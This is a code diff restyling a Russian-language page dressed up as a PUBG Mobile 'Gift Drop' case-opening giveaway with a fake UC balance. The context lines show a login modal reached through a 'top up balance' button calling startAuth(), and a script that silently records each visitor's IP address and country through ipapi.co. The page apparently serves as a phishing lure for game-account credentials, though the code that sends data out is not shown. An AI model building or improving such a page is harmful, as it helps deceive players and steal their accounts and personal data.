@@ -14,27 +14,47 @@
             --pubg-gold: #ffbc00;
             --pubg-gold-dark: #cc9600;
             --pubg-dark: #0b0c0d;
-            --pubg-card: #151618;
             --pubg-blue: #0084ff;
-            --rarity-mythic: linear-gradient(180deg, #ff4646 0%, #720000 100%);
         }
 
         body {
-            background: radial-gradient(circle at center, #1a1c20 0%, #0b0c0d 100%);
+            background-color: var(--pubg-dark);
             color: white;
             font-family: 'Inter', sans-serif;
             margin: 0; padding: 0;
             overflow-x: hidden;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
+            position: relative;
+            min-height: 100vh;
         }
 
-        /* Фоновый паттерн для глубины */
+        /* Фоновое изображение */
         body::before {
-            content: "";
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
-            opacity: 0.3; pointer-events: none; z-index: -1;
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: url('IMG_1718.jpeg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(10px) brightness(0.4);
+            z-index: -1;
+        }
+
+        /* Затемнение фона для лучшей читаемости */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(11, 12, 13, 0.7);
+            z-index: -1;
         }
 
         .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
@@ -53,27 +73,25 @@
             margin-right: 4px;
         }
 
-        /* Улучшенный Header */
         header {
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(15px);
+            background: rgba(0, 0, 0, 0.95);
             padding: 12px 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             position: sticky; top: 0; z-index: 100;
+            backdrop-filter: blur(10px);
         }
 
         .balance-display {
-            background: rgba(255, 255, 255, 0.07);
-            border-radius: 8px;
-            padding: 4px 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 4px 10px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 4px;
             border: 1px solid rgba(255,255,255,0.1);
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
         }
 
         .btn-plus {
@@ -84,36 +102,13 @@
             font-size: 10px; font-weight: bold;
         }
 
-        /* Улучшенные карточки в меню */
-        .menu-card {
-            background: linear-gradient(145deg, #1e1f23, #151618);
-            border: 1px solid rgba(255,255,255,0.05);
-            border-radius: 20px;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
-        }
-
-        .menu-card:active { transform: scale(0.95); }
-        
-        .menu-card::after {
-            content: '';
-            position: absolute; inset: 0;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
-            transform: translateX(-100%);
-            transition: 0.5s;
-        }
-        .menu-card:hover::after { transform: translateX(100%); }
-
-        /* КЕЙС И РУЛЕТКА */
+        /* КЕЙС */
         .case-container {
             position: relative;
-            width: 100%; height: 220px;
-            background: rgba(0,0,0,0.4);
-            margin: 20px 0;
-            border-top: 1px solid rgba(255,188,0,0.1);
-            border-bottom: 1px solid rgba(255,188,0,0.1);
+            width: 100%;
+            height: 180px;
             overflow: hidden;
+            margin: 20px 0;
         }
 
         .case-line {
@@ -122,7 +117,7 @@
             width: 2px; height: 100%;
             background: var(--pubg-gold);
             z-index: 20;
-            box-shadow: 0 0 20px var(--pubg-gold);
+            box-shadow: 0 0 15px var(--pubg-gold);
             transform: translateX(-50%);
         }
 
@@ -131,55 +126,18 @@
             padding: 30px 0;
             transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
             will-change: transform;
-            height: 100%;
         }
 
         .case-item {
-            min-width: 150px;
-            height: 150px;
-            margin: 35px 5px;
-            background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 70%);
-            display: flex; align-items: center; justify-content: center;
-            position: relative;
+            min-width: 140px;
+            width: 140px;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             opacity: 0.5;
         }
-        
-        .case-item img { 
-            width: 110px; height: 110px; 
-            object-fit: contain;
-            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5));
-        }
-
-        /* КНОПКА С ЭФФЕКТОМ БЛИКА */
-        .btn-premium {
-            position: relative;
-            background: linear-gradient(180deg, #0095ff 0%, #005696 100%);
-            overflow: hidden;
-            transition: 0.3s;
-            box-shadow: 0 4px 15px rgba(0, 132, 255, 0.3);
-            color: white;
-            width: calc(100% - 32px);
-            margin: 0 16px;
-            padding: 16px;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 16px;
-            text-align: center;
-            display: block;
-            cursor: pointer;
-            border: none;
-        }
-
-        .btn-premium::before {
-            content: "";
-            position: absolute; top: 0; left: -100%;
-            width: 50%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transform: skewX(-25deg);
-            transition: 0.5s;
-        }
-
-        .btn-premium:active::before { left: 150%; }
+        .case-item img { width: 100px; height: 100px; object-fit: contain; }
 
         .btn-blue {
             background: var(--pubg-blue);
@@ -194,12 +152,15 @@
             display: block;
             cursor: pointer;
             border: none;
+            transition: transform 0.1s;
         }
+
+        .btn-blue:active { transform: scale(0.96); }
 
         /* ОКНО ВЫИГРЫША */
         .win-modal {
             position: fixed; inset: 0;
-            background: rgba(0,0,0,0.98);
+            background: rgba(0,0,0,0.94);
             backdrop-filter: blur(10px);
             z-index: 2000; display: none;
             flex-direction: column; justify-content: center; align-items: center; padding: 20px;
@@ -207,32 +168,14 @@
 
         .win-card {
             background: linear-gradient(180deg, #1c1d22 0%, #0a0b0d 100%);
-            border: 2px solid var(--pubg-gold);
+            border: 1px solid rgba(255, 188, 0, 0.3);
             border-radius: 16px; 
             padding: 50px 24px 30px 24px; 
             width: 90%; max-width: 340px; 
             text-align: center;
             position: relative;
-            box-shadow: 0 0 50px rgba(255, 188, 0, 0.2);
-            animation: modalAppear 0.5s cubic-bezier(0.18, 0.89, 0.32, 1.28);
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
         }
-
-        @keyframes modalAppear {
-            from { transform: scale(0.5); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        .sunburst {
-            position: absolute;
-            top: 40%; left: 50%;
-            width: 400px; height: 400px;
-            background: repeating-conic-gradient(from 0deg, rgba(255,188,0,0.1) 0deg 20deg, transparent 20deg 40deg);
-            transform: translate(-50%, -50%);
-            animation: rotate 20s linear infinite;
-            z-index: 0;
-        }
-
-        @keyframes rotate { from { transform: translate(-50%, -50%) rotate(0deg); } to { transform: translate(-50%, -50%) rotate(360deg); } }
 
         .item-glow {
             position: absolute;
@@ -267,6 +210,7 @@
             cursor: pointer;
             position: relative;
             z-index: 2;
+            transition: transform 0.1s;
         }
 
         .btn-collect:active { transform: scale(0.96); }
@@ -278,8 +222,9 @@
             display: flex; justify-content: space-around; align-items: center;
             border-top: 1px solid rgba(255, 255, 255, 0.05);
             z-index: 50;
+            backdrop-filter: blur(10px);
         }
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer;}
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer; transition: color 0.2s;}
         .nav-item.active { color: var(--pubg-gold); }
 
         .modal {
@@ -287,8 +232,30 @@
             z-index: 1000; display: none; flex-direction: column; padding: 20px;
             justify-content: center;
         }
-        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
+        .login-card { 
+            background: white; 
+            color: black; 
+            border-radius: 16px; 
+            padding: 24px; 
+            backdrop-filter: blur(10px);
+            background: rgba(255, 255, 255, 0.95);
+        }
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
+
+        /* Контентные блоки с прозрачностью */
+        main, section {
+            position: relative;
+            z-index: 1;
+        }
+
+        .bg-\[\\#151618\] {
+            background: rgba(21, 22, 24, 0.85) !important;
+            backdrop-filter: blur(5px);
+        }
+
+        .bg-\[\\#25262b\] {
+            background: rgba(37, 38, 43, 0.9) !important;
+        }
     </style>
 </head>
 <body>
@@ -296,40 +263,28 @@
     <header>
         <div class="flex items-center gap-2 cursor-pointer" id="backBtn" style="visibility: hidden;" onclick="showSection('hub')">
             <i class="fas fa-chevron-left text-gray-400"></i>
-            <span class="text-sm font-bold uppercase tracking-widest text-gray-400">Назад</span>
+            <span class="text-sm font-bold">Назад</span>
         </div>
-        <div class="text-center">
-            <h1 class="pubg-font text-2xl tracking-tighter italic" style="color: var(--pubg-gold);">PUBG <span class="text-white">MOBILE</span></h1>
+        <div class="text-center" style="flex: 1;">
+            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
         </div>
         <div class="balance-display">
-            <div class="uc-icon">UC</div>
-            <span id="headerBalance" class="text-sm font-black">60</span>
-            <div class="btn-plus text-xs">+</div>
+            <span class="uc-icon">UC</span>
+            <span id="headerBalance" class="text-sm font-bold">60</span>
+            <div class="btn-plus">+</div>
         </div>
     </header>
 
     <!-- ГЛАВНОЕ МЕНЮ (HUB) -->
-    <main id="section-hub" class="p-5">
-        <div class="mb-6">
-            <h2 class="pubg-font text-3xl mb-1">События недели</h2>
-            <div class="h-1 w-12 bg-yellow-500"></div>
-        </div>
-
-        <div class="grid grid-cols-2 gap-5">
-            <div class="menu-card p-4 text-center cursor-pointer" onclick="showSection('case')">
-                <div class="relative z-10">
-                    <img src="ruletka1.png" class="h-32 mx-auto mb-3 transform hover:scale-110 transition-transform">
-                    <div class="pubg-font text-blue-400 text-xl font-bold">GIFT DROP</div>
-                    <div class="text-[10px] text-gray-500 uppercase tracking-widest">Доступно сейчас</div>
-                </div>
+    <main id="section-hub" class="p-4">
+        <div class="grid grid-cols-2 gap-4 mt-4">
+            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
+                <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
+                <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
             </div>
-            
-            <div class="menu-card p-4 text-center cursor-pointer" onclick="showSection('spin')">
-                <div class="relative z-10">
-                    <img src="ruletka2.png" class="h-32 mx-auto mb-3 transform hover:scale-110 transition-transform">
-                    <div class="pubg-font text-yellow-500 text-xl font-bold">LUCKY SPIN</div>
-                    <div class="text-[10px] text-gray-500 uppercase tracking-widest">Шанс х2</div>
-                </div>
+            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
+                <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
+                <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
             </div>
         </div>
     </main>
@@ -343,7 +298,7 @@
             <div class="case-line"></div>
             <div id="caseTape" class="case-tape"></div>
         </div>
-        <button id="openBtn" onclick="openCase()" class="btn-premium pubg-font text-2xl py-4 rounded-none border-b-4 border-blue-800 mb-3">Открыть (60 UC)</button>
+        <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</button>
         <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Пополнить баланс</button>
     </section>
 
@@ -371,14 +326,9 @@
 
     <!-- ОКНО ВЫИГРЫША -->
     <div id="winModal" class="win-modal">
-        <div class="sunburst"></div>
         <div class="win-card">
-            <div class="pubg-font text-yellow-500 text-3xl mb-4 italic">ПОЗДРАВЛЯЕМ!</div>
-            <div class="relative py-10">
-                <div class="item-glow"></div>
-                <img id="winPrizeImage" src="" alt="Prize">
-            </div>
-            <div id="winPrizeName" class="pubg-font text-xl mb-6 tracking-widest">НАЗВАНИЕ ПРЕДМЕТА</div>
+            <div class="item-glow"></div>
+            <img id="winPrizeImage" src="" alt="Prize">
             <button onclick="closeWinModal()" class="btn-collect">Забрать приз</button>
         </div>
     </div>
@@ -416,7 +366,7 @@
         let balance = 60; 
         let isSpinning = false;
         let userIP = '';
-        const itemWidth = 150;
+        const itemWidth = 140;
 
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
 
